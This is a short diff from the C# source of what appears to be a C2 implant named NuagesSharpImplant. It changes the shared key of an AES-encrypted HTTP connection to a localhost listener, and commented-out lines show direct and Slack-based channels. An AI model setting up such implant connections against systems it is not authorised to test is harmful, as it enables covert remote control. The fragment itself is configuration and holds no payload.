@@ -23,7 +23,7 @@ namespace NuagesSharpImplant
             //DirectConnection connection = new DirectConnection("http://127.0.0.1:3030/implant/", int.Parse(config["buffersize"]), int.Parse(config["refreshrate"]));
 
             // If the HTTPAES256 Handler is used:
-            HTTPAES256Connection connection = new HTTPAES256Connection("http://127.0.0.1:8888", "hellp", int.Parse(config["buffersize"]), int.Parse(config["refreshrate"]));
+            HTTPAES256Connection connection = new HTTPAES256Connection("http://127.0.0.1:8888", "password", int.Parse(config["buffersize"]), int.Parse(config["refreshrate"]));
 
             // If the SLACKAES256 Handler is used:
             // SLACKAES256Connection connection = new SLACKAES256Connection("password", "CHANNELID", "SLACK_BOT_TOKEN", "SLACK_APP_TOKEN", int.Parse(config["buffersize"]), int.Parse(config["refreshrate"]));
